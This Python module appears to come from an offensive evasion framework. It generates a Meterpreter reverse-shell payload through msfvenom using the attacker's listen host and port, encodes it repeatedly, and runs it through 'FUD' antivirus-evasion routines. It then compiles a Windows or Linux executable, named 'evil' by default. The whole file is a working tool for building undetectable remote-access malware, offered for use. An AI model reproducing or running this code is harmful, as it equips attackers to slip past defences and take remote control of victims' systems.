
from core import utils, controller
from libs import actions
import os, random, importlib

class Payload(controller.Module):
	__info__ = {
		'name': 'Meterpreter Reverse Connection',
		'description' : 'edit here',
		'author': [
			'Module: dmknght, dmknghtx2team@gmail.com',
			'Technology: Diego Cornacchini, oddcod3@gmail.com'
		],
		'references': [
			'https://github.com/dmknght/blurEvasion',
			'https://github.comm/oddcod3/Phantom-Evasion'
		]
	}
	platform = controller.Options('windows', "Target's platfom (windows / linux)")
	architecture = controller.Options('x86', "Target's architecture (x86 / x64)")
	protocol = controller.Options('tcp', "Connection's type (tcp / http / https)")
	lhost = controller.Options('', "Attacker's listen address")
	lport = controller.Options('4444', "Attacker's listen port")
	evasion_tech = controller.Options("PhantomEvasion", "FUD technology")
	evasion_method = controller.Options("MHA", 'Evasion method. Usage :show evasions')
	exec_name = controller.Options('evil', "Name of executable file in source code")

	def run(self):
		try:
			utils.printf("Generating options", 'warn')
			generate = {
				'windows': {
					'x86': 'msfvenom -p windows/meterpreter/reverse_{} -a x86 '.format(self.protocol),
					'x64': 'msfvenom -p windows/x64/meterpreter/reverse_{} -a x64 '.format(self.protocol)
				},
				'linux': 'msfvenom -p linux/{}/meterpreter/reverse_{} -a {} '.format(self.architecture, self.protocol, self.architecture)
			}
			randiter = str(random.randint(10, 15))
			generate = generate[self.platform][self.architecture] + 'lhost={} lport={} '.format(self.lhost, self.lport)
			generate += '--smallest -e x86/shikata_ga_nai -f c -b "\\x00\\x0a\\x0d" -i {} '.format(randiter)
			src_output = 'output/meterpreter_reverse.c'
			generate += '-o {} --platform {}'.format(src_output, self.platform)
			utils.printf("Generating payload", 'warn')
			os.popen(generate)
			utils.printf("Output source generated at {}".format(src_output), 'good')
		except:
			utils.printf("Error while generating payload", 'bad')
			return ''
		utils.printf("Generating FUD payload", 'warn')
		try:
			data = actions.getout(src_output)
			evade_method = "{}_mathinject_{}".format(self.evasion_method, self.platform)
			evade_tech = importlib.import_module('evasion.{}'.format(self.evasion_tech))
			evade_run = getattr(evade_tech, evade_method)(data, self.exec_name)
			data = evade_run.run()
			actions.writeout(data, src_output)
			utils.printf("Generating FUD payload completed", 'good')
		except:
			utils.printf("Error while generating FUD payload", 'bad')
			return ''
		utils.printf("Buidling executable file", 'warn')
		actions.build_exec(self.platform, self.architecture, src_output, 'output/')
		utils.printf("Build completed", 'good')
